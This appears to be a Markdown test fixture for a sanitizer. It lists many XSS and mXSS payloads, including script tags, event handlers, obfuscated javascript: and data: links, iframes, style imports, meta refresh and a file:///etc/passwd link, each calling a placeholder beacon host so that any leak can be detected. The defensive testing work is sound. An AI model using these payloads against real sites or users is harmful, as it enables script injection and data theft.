# Hostile Markdown fixture

Phase 11 (PREV-02). Every section must render inert: no script, no handler, no
fetch, no unsafe link. Every network reference is http://BEACON/<label>; 11-10
replaces BEACON with the VM's loopback beacon address.

## intro

Start of the document. The `#intro` link below scrolls here.

## script

<script>fetch('http://BEACON/md-script')</script>

Inline <script>new Image().src='http://BEACON/md-script-inline'</script> script.

## img-onerror

<img src="http://BEACON/md-img-onerror" onerror="fetch('http://BEACON/md-img-onerror-handler')">

Inline <img src=x onerror="fetch('http://BEACON/md-img-onerror-inline')"> image.

## javascript-links

[plain](javascript:fetch('http://BEACON/md-js-plain'))

[upper](JAVASCRIPT:fetch('http://BEACON/md-js-upper'))

[entity](&#106;avascript:fetch('http://BEACON/md-js-entity'))

[hex entity](&#x6A;&#x61;vascript:fetch('http://BEACON/md-js-hex'))

[leading space]( javascript:fetch('http://BEACON/md-js-space'))

[tab](java	script:fetch('http://BEACON/md-js-tab'))

[newline entity](java&#10;script:fetch('http://BEACON/md-js-newline'))

[tab entity](java&#9;script:fetch('http://BEACON/md-js-tab-entity'))

[angle](<javascript:fetch('http://BEACON/md-js-angle')>)

[reference][jsref]

[jsref]: javascript:fetch('http://BEACON/md-js-reference')

Autolink: <javascript:fetch('http://BEACON/md-js-autolink')>

## data-links

[data html](data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cDovL0JFQUNPTi9tZC1kYXRhJyk8L3NjcmlwdD4=)

[data plain](data:text/html,<script>fetch('http://BEACON/md-data-plain')</script>)

## vbscript-and-file-links

[vbscript](vbscript:msgbox)

[file](file:///etc/passwd)

[relative](notes/other.md)

## images

![remote image](http://BEACON/md-image-remote.png)

![relative image](images/local.png)

![](http://BEACON/md-image-no-alt.png)

[![linked image](http://BEACON/md-image-linked.png)](https://example.com/linked)

![ref image][imgref]

[imgref]: http://BEACON/md-image-reference.png

## iframe

<iframe src="http://BEACON/md-iframe"></iframe>

## object

<object data="http://BEACON/md-object"></object>

## embed

<embed src="http://BEACON/md-embed">

## svg-onload

<svg onload="fetch('http://BEACON/md-svg-onload')"><image href="http://BEACON/md-svg-image"/></svg>

## math-mxss

<math><mtext><table><mglyph><style><img src=x onerror="fetch('http://BEACON/md-math-mxss')"></style></mglyph></table></mtext></math>

<noscript><p title="</noscript><img src=x onerror=fetch('http://BEACON/md-noscript-mxss')>"></p></noscript>

<title><img src=x onerror="fetch('http://BEACON/md-title-mxss')"></title>

## style-import

<style>@import url('http://BEACON/md-style-import.css'); body { background: url('http://BEACON/md-style-bg') }</style>

<p style="background:url('http://BEACON/md-style-attr')">styled paragraph</p>

## form

<form action="http://BEACON/md-form"><input name="q"><button>Send</button></form>

## meta-refresh

<meta http-equiv="refresh" content="0;url=http://BEACON/md-meta-refresh">

## base-href

<base href="http://BEACON/md-base/">

## link-stylesheet

<link rel="stylesheet" href="http://BEACON/md-link-stylesheet.css">

## safe-links

[https link](https://example.com/safe)

<https://example.com/autolink>

[mail](mailto:someone@example.com)

[to intro](#intro)

## task-list

- [x] done item
- [ ] open item

## table

| Left | Center | Right |
|:-----|:------:|------:|
| a    | b      | c     |
